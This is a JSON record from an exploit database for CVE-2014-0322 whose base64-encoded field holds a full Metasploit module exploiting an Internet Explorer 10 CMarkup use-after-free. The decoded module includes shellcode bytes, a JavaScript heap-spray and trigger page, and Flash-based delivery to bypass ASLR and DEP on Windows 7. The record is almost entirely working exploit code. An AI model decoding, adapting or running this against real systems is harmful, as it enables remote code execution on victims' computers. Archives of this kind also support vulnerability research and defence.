{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cC8vbWV0YXNwbG9pdC5jb20vZG93bmxvYWQNCiMgQ3VycmVudCBzb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsNCiMjDQoNCnJlcXVpcmUgJ21zZi9jb3JlJw0KDQpjbGFzcyBNZXRhc3Bsb2l0MyA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIFJhbmsgPSBOb3JtYWxSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6QnJvd3NlckV4cGxvaXRTZXJ2ZXINCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvPXt9KQ0KICAgIHN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQogICAgICAnTmFtZScgICAgICAgICAgID0+ICJNUzE0LTAxMiBNaWNyb3NvZnQgSW50ZXJuZXQgRXhwbG9yZXIgQ01hcmt1cCBVc2UtQWZ0ZXItRnJlZSIsDQogICAgICAnRGVzY3JpcHRpb24nICAgID0+ICVxew0KICAgICAgICBUaGlzIG1vZHVsZSBleHBsb2l0cyBhbiB1c2UgYWZ0ZXIgZnJlZSBjb25kaXRpb24gb24gSW50ZXJuZXQgRXhwbG9yZXIgYXMgdXNlZCBpbiB0aGUgd2lsZA0KICAgICAgICBvbiB0aGUgIk9wZXJhdGlvbiBTbm93TWFuIiBpbiBGZWJydWFyeSAyMDE0LiBUaGUgbW9kdWxlIHVzZXMgRmxhc2ggUGxheWVyIDEyIGluIG9yZGVyIHRvDQogICAgICAgIGJ5cGFzcyBBU0xSIGFuZCBmaW5hbGx5IERFUC4NCiAgICAgIH0sDQogICAgICAnTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ0F1dGhvcicgICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgJ1Vua25vd24nLCAjIFZ1bG5lcmFiaWxpdHkgZGlzY292ZXJ5IGFuZCBFeHBsb2l0IGluIHRoZSB3aWxkDQogICAgICAgICAgJ0plYW4tSmFtaWwgS2hhbGlmZScsICMgRXhwbG9pdA0KICAgICAgICAgICdqdWFuIHZhenF1ZXonICMgTWV0YXNwbG9pdCBtb2R1bGUNCiAgICAgICAgXSwNCiAgICAgICdSZWZlcmVuY2VzJyAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ0NWRScsICcyMDE0LTAzMjInIF0sDQogICAgICAgICAgWyAnTVNCJywgJ01TMTQtMDEyJyBdLA0KICAgICAgICAgIFsgJ0JJRCcsICc2NTU1MScgXSwNCiAgICAgICAgICBbICdVUkwnLCAnaHR0cDovL3d3dy5maXJlZXllLmNvbS9ibG9nL3RlY2huaWNhbC9jeWJlci1leHBsb2l0cy8yMDE0LzAyL29wZXJhdGlvbi1zbm93bWFuLWRlcHV0eWRvZy1hY3Rvci1jb21wcm9taXNlcy11cy12ZXRlcmFucy1vZi1mb3JlaWduLXdhcnMtd2Vic2l0ZS5odG1sJ10sDQogICAgICAgICAgWyAnVVJMJywgJ2h0dHA6Ly9oZHdzZWMuZnIvYmxvZy9DVkUtMjAxNC0wMzIyLmh0bWwnIF0NCiAgICAgICAgXSwNCiAgICAgICdQbGF0Zm9ybScgICAgICAgPT4gJ3dpbicsDQogICAgICAnQXJjaCcgICAgICAgICAgID0+IEFSQ0hfWDg2LA0KICAgICAgJ1BheWxvYWQnICAgICAgICA9Pg0KICAgICAgICB7DQogICAgICAgICAgJ1NwYWNlJyAgICAgICAgICA9PiA5NjAsDQogICAgICAgICAgJ0Rpc2FibGVOb3BzJyAgICA9PiB0cnVlLA0KICAgICAgICAgICdQcmVwZW5kRW5jb2RlcicgPT4gc3RhY2tfYWRqdXN0DQogICAgICAgIH0sDQogICAgICAnQnJvd3NlclJlcXVpcmVtZW50cycgPT4NCiAgICAgICAgew0KICAgICAgICAgIDpzb3VyY2UgICAgICA9PiAvc2NyaXB0fGhlYWRlcnMvaSwNCiAgICAgICAgICA6b3NfbmFtZSAgICAgPT4gTXNmOjpPcGVyYXRpbmdTeXN0ZW1zOjpXSU5ET1dTLA0KICAgICAgICAgIDpvc19mbGF2b3IgICA9PiBNc2Y6Ok9wZXJhdGluZ1N5c3RlbXM6OldpbmRvd3NWZXJzaW9uczo6U0VWRU4sDQogICAgICAgICAgOnVhX25hbWUgICAgID0+IE1zZjo6SHR0cENsaWVudHM6OklFLA0KICAgICAgICAgIDp1YV92ZXIgICAgICA9PiAnMTAuMCcsDQogICAgICAgICAgOm1zaHRtbF9idWlsZCA9PiBsYW1iZGEgeyB8dmVyfCB2ZXIudG9faSA8IDE2ODQzIH0sDQogICAgICAgICAgOmZsYXNoICAgICAgID0+IC9eMTJcLi8NCiAgICAgICAgfSwNCiAgICAgICdEZWZhdWx0T3B0aW9ucycgPT4NCiAgICAgICAgew0KICAgICAgICAgICdJbml0aWFsQXV0b1J1blNjcmlwdCcgPT4gJ21pZ3JhdGUgLWYnLA0KICAgICAgICAgICdSZXRyaWVzJyAgICAgICAgICAgICAgPT4gZmFsc2UNCiAgICAgICAgfSwNCiAgICAgICdUYXJnZXRzJyAgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ1dpbmRvd3MgNyBTUDEgLyBJRSAxMCAvIEZQIDEyJywgeyB9IF0sDQogICAgICAgIF0sDQogICAgICAnUHJpdmlsZWdlZCcgICAgID0+IGZhbHNlLA0KICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAiRmViIDEzIDIwMTQiLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICA9PiAwKSkNCg0KICBlbmQNCg0KICBkZWYgc3RhY2tfYWRqdXN0DQogICAgYWRqdXN0ID0gIlx4NjRceGExXHgxOFx4MDBceDAwXHgwMCIgICMgbW92IGVheCwgZnM6WzB4MTggIyBnZXQgdGViDQogICAgYWRqdXN0IDw8ICJceDgzXHhDMFx4MDgiICAgICAgICAgICAgICMgYWRkIGVheCwgYnl0ZSA4ICMgZ2V0IHBvaW50ZXIgdG8gc3RhY2tsaW1pdA0KICAgIGFkanVzdCA8PCAiXHg4Ylx4MjAiICAgICAgICAgICAgICAgICAjIG1vdiBlc3AsIFtlYXhdICMgcHV0IGVzcCBhdCBzdGFja2xpbWl0DQogICAgYWRqdXN0IDw8ICJceDgxXHhDNFx4MzBceEY4XHhGRlx4RkYiICMgYWRkIGVzcCwgLTIwMDAgIyBwbHVzIGEgbGl0dGxlIG9mZnNldA0KDQogICAgYWRqdXN0DQogIGVuZA0KDQogIGRlZiBjcmVhdGVfc3dmDQogICAgcGF0aCA9IDo6RmlsZS5qb2luKCBNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgImV4cGxvaXRzIiwgIkNWRS0yMDE0LTAzMjIiLCAiQXNYcGxvaXQuc3dmIiApDQogICAgZmQgPSA6OkZpbGUub3BlbiggcGF0aCwgInJiIiApDQogICAgc3dmID0gZmQucmVhZChmZC5zdGF0LnNpemUpDQogICAgZmQuY2xvc2UNCiAgICByZXR1cm4gc3dmDQogIGVuZA0KDQogIGRlZiBleHBsb2l0DQogICAgQHN3ZiA9IGNyZWF0ZV9zd2YNCiAgICBzdXBlcg0KICBlbmQNCg0KICBkZWYgb25fcmVxdWVzdF91cmkoY2xpLCByZXF1ZXN0KQ0KICAgIHByaW50X3N0YXR1cygiUmVxdWVzdDogI3tyZXF1ZXN0LnVyaX0iKQ0KDQogICAgaWYgcmVxdWVzdC51cmkgPX4gL1wuc3dmJC8NCiAgICAgIHByaW50X3N0YXR1cygiU2VuZGluZyBTV0YuLi4iKQ0KICAgICAgc2VuZF9yZXNwb25zZShjbGksIEBzd2YsIHsnQ29udGVudC1UeXBlJz0+J2FwcGxpY2F0aW9uL3gtc2hvY2t3YXZlLWZsYXNoJywgJ1ByYWdtYScgPT4gJ25vLWNhY2hlJ30pDQogICAgICByZXR1cm4NCiAgICBlbmQNCg0KICAgIHN1cGVyDQogIGVuZA0KDQogIGRlZiBvbl9yZXF1ZXN0X2V4cGxvaXQoY2xpLCByZXF1ZXN0LCB0YXJnZXRfaW5mbykNCiAgICBwcmludF9zdGF0dXMoIlNlbmRpbmcgSFRNTC4uLiIpDQogICAgc2VuZF9leHBsb2l0X2h0bWwoY2xpLCBleHBsb2l0X3RlbXBsYXRlKGNsaSwgdGFyZ2V0X2luZm8pKQ0KICBlbmQNCg0KICBkZWYgZXhwbG9pdF90ZW1wbGF0ZShjbGksIHRhcmdldF9pbmZvKQ0KDQogICAgZmxhc2hfcGF5bG9hZCA9ICIiDQogICAgZ2V0X3BheWxvYWQoY2xpLHRhcmdldF9pbmZvKS51bnBhY2soIlYqIikuZWFjaCBkbyB8aXwNCiAgICAgIGZsYXNoX3BheWxvYWQgPDwgIjB4I3tpLnRvX3MoMTYpfSwiDQogICAgZW5kDQogICAgZmxhc2hfcGF5bG9hZC5nc3ViISgvLCQvLCAiIikNCg0KICAgIGh0bWxfdGVtcGxhdGUgPSAlUXwNCiAgICA8aHRtbD4NCiAgICA8aGVhZD4NCiAgICA8L2hlYWQ+DQogICAgPGJvZHk+DQoNCiAgICA8c2NyaXB0Pg0KDQogICAgdmFyIGdfYXJyID0gW107DQogICAgdmFyIGFyckxlbiA9IDB4MjUwOw0KDQogICAgZnVuY3Rpb24gZHdvcmQyZGF0YShkd29yZCkNCiAgICB7DQogICAgICB2YXIgZCA9IE51bWJlcihkd29yZCkudG9TdHJpbmcoMTYpOw0KICAgICAgd2hpbGUgKGQubGVuZ3RoIDwgOCkNCiAgICAgICAgZCA9ICcwJyArIGQ7DQoNCiAgICAgIHJldHVybiB1bmVzY2FwZSgnJXUnICsgZC5zdWJzdHIoNCwgOCkgKyAnJXUnICsgZC5zdWJzdHIoMCwgNCkpOw0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIGVYcGwoKQ0KICAgIHsNCiAgICAgIHZhciBhPTA7DQoNCiAgICAgIGZvciAoYT0wOyBhIDwgYXJyTGVuOyBhKyspIHsNCiAgICAgICAgICBnX2FyclthXSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICAgICAgfQ0KDQogICAgICB2YXIgYiA9IGR3b3JkMmRhdGEoMHgxOWZmZmZmMyk7DQoNCiAgICAgIHdoaWxlIChiLmxlbmd0aCA8IDB4MzYwKSB7DQogICAgICAgIGlmIChiLmxlbmd0aCA9PSAoMHg5OCAvIDIpKQ0KICAgICAgICB7DQogICAgICAgICAgYiArPSBkd29yZDJkYXRhKDB4MWEwMDAwMTApOw0KICAgICAgICB9DQogICAgICAgIGVsc2UgaWYgKGIubGVuZ3RoID09ICgweDk0IC8gMikpDQogICAgICAgIHsNCiAgICAgICAgICBiICs9IGR3b3JkMmRhdGEoMHgxYTExMTExMSk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAoYi5sZW5ndGggPT0gKDB4MTVjIC8gMikpDQogICAgICAgIHsNCiAgICAgICAgICBiICs9IGR3b3JkMmRhdGEoMHg0MjQyNDI0Mik7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgYiArPSBkd29yZDJkYXRhKDB4MTlmZmZmZjMpOw0KICAgICAgICB9DQogICAgICB9DQoNCiAgICAgIHZhciBkID0gYi5zdWJzdHJpbmcoMCwgKCAweDM0MCAtIDIgKS8yKTsNCg0KICAgICAgdHJ5ew0KICAgICAgICB0aGlzLm91dGVySFRNTD10aGlzLm91dGVySFRNTA0KICAgICAgfSBjYXRjaChlKXsNCg0KICAgICAgfQ0KDQogICAgICBDb2xsZWN0R2FyYmFnZSgpOw0KDQogICAgICBmb3IgKGE9MDsgYSA8IGFyckxlbjsgYSsrKQ0KICAgICAgICB7DQogICAgICAgICAgZ19hcnJbYV0udGl0bGUgPSBkLnN1YnN0cmluZygwLCBkLmxlbmd0aCk7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBmdW5jdGlvbiB0cmlnZ2VyKCkNCiAgICB7DQogICAgICAgIHZhciBhID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoInNjcmlwdCIpOw0KICAgICAgICB2YXIgYiA9IGFbMF07DQogICAgICAgIGIub25wcm9wZXJ0eWNoYW5nZSA9IGVYcGw7DQogICAgICAgIHZhciBjID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnU0VMRUNUJyk7DQogICAgICAgIGMgPSBiLmFwcGVuZENoaWxkKGMpOw0KICAgIH0NCg0KICAgIDwvc2NyaXB0Pg0KICAgIDxlbWJlZCBzcmM9I3tyYW5kX3RleHRfYWxwaGEoNCArIHJhbmQoMykpfS5zd2YgRmxhc2hWYXJzPSJ2ZXJzaW9uPTwlPWZsYXNoX3BheWxvYWQlPiIgd2lkdGg9IjEwIiBoZWlnaHQ9IjEwIj4NCiAgICA8L2VtYmVkPg0KICAgIDwvYm9keT4NCiAgICA8L2h0bWw+DQogICAgfA0KDQogICAgcmV0dXJuIGh0bWxfdGVtcGxhdGUsIGJpbmRpbmcoKQ0KICBlbmQNCg0KZW5k", 
    "filename": "platforms/windows/remote/32904.rb", 
    "id": "32904", 
    "cves": [
        "CVE-2014-0322"
    ]
}